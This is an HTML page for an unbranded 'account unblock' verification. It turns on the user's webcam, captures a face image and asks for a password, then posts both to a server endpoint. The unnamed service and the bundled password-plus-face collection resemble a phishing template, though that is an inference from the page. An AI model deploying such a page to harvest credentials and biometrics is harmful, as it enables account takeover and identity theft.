<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="UTF-8" />

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
  />

  <title>Unblock Request</title>

  <!-- Bootstrap -->
  <link
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
    rel="stylesheet"
  >

  <!-- Icons -->
  <link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css"
  >

  <style>

    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      -webkit-tap-highlight-color:transparent;
    }

    html{
      height:100%;
    }

    body{
      min-height:100dvh;

      display:flex;
      justify-content:center;
      align-items:center;

      background:linear-gradient(
        135deg,
        #0f172a,
        #1e293b,
        #334155
      );

      font-family:"Segoe UI",sans-serif;

      position:relative;

      overflow:hidden;

      padding:16px;
    }

    /* SAFE AREA */

    @supports(padding:max(0px)){

      body{
        padding-top:max(16px, env(safe-area-inset-top));
        padding-bottom:max(16px, env(safe-area-inset-bottom));
        padding-left:max(16px, env(safe-area-inset-left));
        padding-right:max(16px, env(safe-area-inset-right));
      }

    }

    /* GLOW */

    body::before{
      content:"";

      position:absolute;

      width:500px;
      height:500px;

      background:#2563eb;

      border-radius:50%;

      top:-220px;
      left:-180px;

      filter:blur(120px);

      opacity:0.32;
    }

    body::after{
      content:"";

      position:absolute;

      width:420px;
      height:420px;

      background:#7c3aed;

      border-radius:50%;

      bottom:-220px;
      right:-160px;

      filter:blur(120px);

      opacity:0.28;
    }

    /* CARD */

    .card-box{
      width:100%;
      max-width:520px;

      background:rgba(255,255,255,0.08);

      backdrop-filter:blur(20px);
      -webkit-backdrop-filter:blur(20px);

      border:1px solid rgba(255,255,255,0.12);

      border-radius:32px;

      padding:36px;

      color:white;

      box-shadow:
        0 10px 40px rgba(0,0,0,0.25);

      position:relative;
      z-index:10;

      overflow:hidden;
    }

    /* LOGO */

    .logo{
      width:90px;
      height:90px;

      margin:auto;

      border-radius:26px;

      background:linear-gradient(
        135deg,
        #2563eb,
        #7c3aed
      );

      display:flex;
      justify-content:center;
      align-items:center;

      font-size:40px;

      margin-bottom:22px;

      box-shadow:
        0 12px 30px rgba(37,99,235,0.4);
    }

    /* TITLES */

    .main-title{
      font-size:32px;
      font-weight:800;
      margin-bottom:10px;
    }

    .subtitle{
      color:#cbd5e1;
      font-size:15px;
      line-height:1.7;
      opacity:0.95;
    }

    /* VIDEO */

    .camera-box{
      margin-top:24px;
      position:relative;
    }

    video,
    canvas{
      width:100%;

      border-radius:22px;

      border:2px solid rgba(255,255,255,0.08);

      background:#111827;

      overflow:hidden;
    }

    /* INPUT */

    .form-control{
      height:56px;

      border:none;

      border-radius:18px;

      background:rgba(255,255,255,0.08);

      color:white;

      padding-left:16px;

      font-size:15px;
    }

    .form-control::placeholder{
      color:#cbd5e1;
    }

    .form-control:focus{
      background:rgba(255,255,255,0.08);

      box-shadow:
        0 0 0 4px rgba(59,130,246,0.15);

      color:white;
    }

    /* BUTTONS */

    .btn-modern{
      height:56px;

      border:none;

      border-radius:18px;

      font-weight:700;

      font-size:15px;

      transition:0.3s;

      touch-action:manipulation;
    }

    .btn-modern:active{
      transform:scale(0.98);
    }

    .btn-capture{
      background:linear-gradient(
        135deg,
        #111827,
        #1f2937
      );

      color:white;
    }

    .btn-capture:hover{
      transform:translateY(-2px);

      box-shadow:
        0 10px 25px rgba(0,0,0,0.25);
    }

    .btn-submit{
      background:linear-gradient(
        135deg,
        #2563eb,
        #7c3aed
      );
    }

    .btn-submit:hover{
      transform:translateY(-2px);

      box-shadow:
        0 10px 25px rgba(37,99,235,0.35);
    }

    /* STATUS */

    .capture-status{
      background:rgba(34,197,94,0.15);

      border:1px solid rgba(34,197,94,0.3);

      color:#86efac;

      padding:12px;

      border-radius:16px;

      font-size:14px;

      margin-top:14px;

      display:none;
    }

    .capture-status.show{
      display:block;
    }

    /* MOBILE */

    @media(max-width:768px){

      body{
        padding:14px;
      }

      .card-box{
        padding:30px 24px;
        border-radius:28px;
      }

      .main-title{
        font-size:28px;
      }

    }

    /* SMALL MOBILE */

    @media(max-width:480px){

      body{
        padding:12px;
      }

      .card-box{
        padding:26px 18px;
        border-radius:24px;
      }

      .logo{
        width:78px;
        height:78px;
        font-size:34px;
        border-radius:22px;
      }

      .main-title{
        font-size:24px;
      }

      .subtitle{
        font-size:14px;
      }

      .btn-modern{
        height:54px;
        font-size:14px;
      }

      .form-control{
        height:54px;
      }

    }

  </style>

</head>

<body>

<div class="card-box">

  <div class="text-center">

    <div class="logo">
      <i class="bi bi-camera-video-fill"></i>
    </div>

    <h2 class="main-title">
      Account Verification
    </h2>

    <p class="subtitle">
      Verify your identity to request account unblock
    </p>

  </div>

  <!-- CAMERA -->

  <div class="camera-box">

    <video
      id="video"
      autoplay
      playsinline
      muted
    ></video>

    <canvas
      id="canvas"
      style="display:none;"
    ></canvas>

  </div>

  <!-- CAPTURE BUTTON -->

  <button
    type="button"
    class="btn btn-dark w-100 btn-modern btn-capture mt-3"
    onclick="captureFace()"
  >

    <i class="bi bi-camera-fill"></i>

    Capture Face

  </button>

  <!-- STATUS -->

  <div
    id="captureStatus"
    class="capture-status"
  >

    ✅ Face captured successfully

  </div>

  <!-- FORM -->

  <form
    method="POST"
    action="/submit-unblock-request"
  >

    <input
      type="hidden"
      name="image"
      id="imageInput"
    >

    <input
      type="password"
      name="password"
      class="form-control mt-3"
      placeholder="Confirm Password"
      autocomplete="current-password"
      required
    >

    <button
      class="btn btn-primary w-100 btn-modern btn-submit mt-3"
    >

      <i class="bi bi-send-fill"></i>

      Submit Request

    </button>

  </form>

</div>

<script>

const video =
  document.getElementById("video");

/* CAMERA ACCESS */

navigator.mediaDevices
.getUserMedia({
  video:{
    facingMode:"user"
  }
})
.then(stream => {

  video.srcObject = stream;

})
.catch(err => {

  console.error(err);

  alert(
    "Camera access denied or unavailable"
  );

});

/* CAPTURE */

function captureFace(){

  const canvas =
    document.getElementById("canvas");

  canvas.width =
    video.videoWidth;

  canvas.height =
    video.videoHeight;

  const ctx =
    canvas.getContext("2d");

  ctx.drawImage(
    video,
    0,
    0
  );

  const image =
    canvas.toDataURL(
      "image/jpeg",
      0.9
    );

  document.getElementById(
    "imageInput"
  ).value = image;

  document
    .getElementById(
      "captureStatus"
    )
    .classList
    .add("show");

}

/* TOUCH SUPPORT */

document.querySelectorAll(
  "button, a"
).forEach(el => {

  el.addEventListener(
    "touchstart",
    () => {},
    { passive:true }
  );

});

</script>

</body>
</html>